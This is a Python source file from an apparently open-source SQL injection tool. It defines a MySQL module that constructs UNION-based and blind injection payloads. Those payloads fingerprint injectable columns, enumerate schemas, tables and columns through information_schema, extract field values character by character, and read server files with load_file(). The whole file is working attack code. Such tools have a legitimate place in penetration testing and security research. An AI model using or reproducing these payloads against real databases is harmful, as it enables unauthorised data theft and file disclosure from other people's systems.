#!/usr/bin/python3
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.
#
# Developed by: Nasel(http://www.nasel.com.ar)
#
# Authors:
# Matías Fontanini
# Santiago Alessandri
# Gastón Traberg

from . import DbmsMole, FingerBase

class MysqlMole(DbmsMole):
    out_delimiter_result = "::-::"
    out_delimiter = DbmsMole.to_hex(out_delimiter_result)
    inner_delimiter_result = "><"
    inner_delimiter = DbmsMole.to_hex(inner_delimiter_result)
    integer_field_finger = 'ascii(0x3a) + (length(0x49494949494949) * 190) + (ascii(0x49) * 31337)'
    integer_field_finger_result = '2288989'
    integer_out_delimiter = '3133707'
    integer_inner_delimiter = '0x3e3c'
    comment_list = ['#', '--', '/*', ' ']

    def __init__(self):
        self.finger = FingerBase([], [], False)

    @classmethod
    def to_string(cls, data):
        return DbmsMole.to_hex(data)

    def _schemas_query_info(self):
        return {
            'table' : 'information_schema.schemata',
            'field' : ['schema_name']
        }

    def _tables_query_info(self, db):
        return {
            'table' : 'information_schema.tables',
            'field' : ['table_name'],
            'filter': "table_schema = '{db}'".format(db=db)
        }

    def _columns_query_info(self, db, table):
        return {
            'table' : 'information_schema.columns',
            'field' : ['column_name'],
            'filter': "table_schema = '{db}' and table_name = '{table}'".format(db=db, table=table)
        }

    def _fields_query_info(self, fields, db, table, where):
        return {
            'table' : db + '.' + table,
            'field' : fields,
            'filter': where
        }

    def _dbinfo_query_info(self):
        return {
            'field' : ['user()','version()','database()'],
            'table' : ''
        }

    def _read_file_query_info(self, filename):
        return {
            'field' : ['load_file({filename})'.format(filename=DbmsMole.to_hex(filename))],
            'table' : '',
        }

    def _concat_fields(self, fields):
        if not self.finger or self.finger.is_string_query:
            return 'CONCAT_WS(' + MysqlMole.inner_delimiter + ',' + ','.join(map(lambda x: 'IFNULL(' + x + ', 0x20)', fields)) + ')'
        else:
            return 'CONCAT_WS(' + MysqlMole.integer_inner_delimiter + ',' + ','.join(map(lambda x: 'IFNULL(' + x + ', 0x20)', fields)) + ')'

    @classmethod
    def injectable_field_fingers(cls, query_columns, base):
        hashes_str = []
        hashes_int = []
        to_search = []
        for i in range(0, query_columns):
            hashes_str.append(DbmsMole.to_hex(str(base + i)))
            hashes_int.append(str(base + i))
            to_search.append(str(base + i))
        return [FingerBase(hashes_str, to_search, True), FingerBase(hashes_int, to_search, False)]

    @classmethod
    def dbms_name(cls):
        return 'Mysql'

    @classmethod
    def blind_field_delimiter(cls):
        return MysqlMole.inner_delimiter_result

    @classmethod
    def field_finger_query(cls, columns, finger, injectable_field):
        query = " and 1 = 0 UNION ALL SELECT "
        query_list = list(map(str, range(columns)))
        if finger.is_string_query:
            query_list[injectable_field] = 'CONCAT(@@version,' + DbmsMole.to_hex(DbmsMole.field_finger_str) + ')'
        else:
            query_list[injectable_field] = MysqlMole.integer_field_finger
        query += ",".join(query_list)
        return query

    @classmethod
    def field_finger(cls, finger):
        if finger.is_string_query:
            return DbmsMole.field_finger_str
        else:
            return MysqlMole.integer_field_finger_result

    @classmethod
    def dbms_check_blind_query(cls):
        return ' and 0 < (select length(@@version)) '

    def forge_count_query(self, fields, table_name, injectable_field, where = "1=1"):
        query = " and 1=0 UNION ALL SELECT "
        query_list = list(self.finger._query)
        query_list[injectable_field] = ("CONCAT(" + MysqlMole.out_delimiter + ",COUNT(*)," + MysqlMole.out_delimiter + ")")
        query += ','.join(query_list)
        if len(table_name) > 0:
            query += " from " + table_name
            query += " where " + self.parse_condition(where)
        return query

    def forge_query(self, fields, table_name, injectable_field, where = "1=1", offset = 0):
        query = " and 1=0 UNION ALL SELECT "
        query_list = list(self.finger._query)
        query_list[injectable_field] = ("CONCAT(" +
                                            MysqlMole.out_delimiter +
                                            "," + self._concat_fields(fields) + "," +
                                            MysqlMole.out_delimiter +
                                        ")")
        query += ','.join(query_list)
        if len(table_name) > 0:
            query += " from " + table_name
            query += " where " + self.parse_condition(where) + \
                     " limit 1 offset " + str(offset) + " "
        return query

    def forge_integer_count_query(self, fields, table, injectable_field, where="1=1", offset=0):
        if len(table) > 0:
            table = ' from ' + table
            where = ' where ' + where
        else:
            where = ' '
        query = ' and 1=0 union all select '
        query_list = list(self.finger._query)
        query_list[injectable_field] = ('concat(' + MysqlMole.integer_out_delimiter +
               ',count(*), ' + MysqlMole.integer_out_delimiter + ')')
        query += ','.join(query_list)
        query += table+' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset)
        return query

    def forge_integer_query(self, index, fields, table, injectable_field, where="1=1", offset=0):
        if len(table) > 0:
            table = ' from ' + table
            where = ' where ' + where
        else:
            where = ' '
        query = ' and 1=0 union all select '
        query_list = list(self.finger._query)
        query_list[injectable_field] = ('concat(' + MysqlMole.integer_out_delimiter +
               ',ascii(substring(concat('+self._concat_fields(fields)+'), '+str(index)+', 1)), ' + MysqlMole.integer_out_delimiter + ')')
        query += ','.join(query_list)
        query += table+' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset)
        return query

    def forge_integer_len_query(self, fields, table, injectable_field, where="1=1", offset=0):
        if len(table) > 0:
            table = ' from ' + table
            where = ' where ' + where
        else:
            where = ' '
        query = ' and 1=0 union all select '
        query_list = list(self.finger._query)
        query_list[injectable_field] = ('concat(' + MysqlMole.integer_out_delimiter +
               ',length(concat('+self._concat_fields(fields)+')),' + MysqlMole.integer_out_delimiter+ ')')
        query += ','.join(query_list)
        query += table+' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset)
        return query

    def set_good_finger(self, finger):
        self.finger = finger
        self.finger._query = list(map(lambda x: str(x), range(len(self.finger._query))))

    def parse_results(self, url_data):
        if not self.finger or self.finger.is_string_query:
            data_list = url_data.split(MysqlMole.out_delimiter_result)
        else:
            data_list = url_data.split(MysqlMole.integer_out_delimiter)
        if len(data_list) < 3:
            return None
        data = data_list[1]
        if not self.finger or self.finger.is_string_query:
            return data.split(MysqlMole.inner_delimiter_result)
        else:
            return data.split(MysqlMole.inner_delimiter_result)

    def is_string_query(self):
        return self.finger.is_string_query

    def __str__(self):
        return "Mysql Mole"
